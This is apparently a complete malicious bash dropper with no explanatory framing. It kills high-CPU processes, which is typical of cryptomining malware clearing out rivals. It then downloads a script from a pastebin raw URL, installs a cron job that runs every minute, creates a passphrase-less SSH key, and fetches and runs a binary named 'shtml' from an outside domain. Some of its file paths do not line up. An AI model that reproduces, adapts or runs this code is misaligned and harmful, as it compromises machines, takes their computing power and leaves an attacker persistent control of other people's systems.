#!/bin/bash

urlprefix='https://pastebin.com/raw'
sshtml='https://imersiv.ca'

ps aux | grep -vw shtml | awk '{if($3>40.0) print $2}' | while read procid
do
kill -9 $procid
done
[ ! -f ~/.bd/crontab ] && mkdir ~/.bd
curl -s -o ~/.bd/bd.sh $urlprefix/P2rfkcKJ
chmod +x ~/.bd/bd.sh
[ ! -f ~/.bd/crontab ] && echo '* * * * * /bin/bash ~/.bd/sshtml > /dev/null 2>&1' >> ~/.bd/crontab
crontab ~/.bd/crontab
[ ! -f ~/.ssh/id_rsa.pub ] && ssh-keygen -t rsa -q -N '' -f ~/.ssh/id_rsa
[ ! -f ~/.bd/shtml ] && wget $sshtml/shtml
chmod +x ~/.bd/shtml
nohup ./shtml
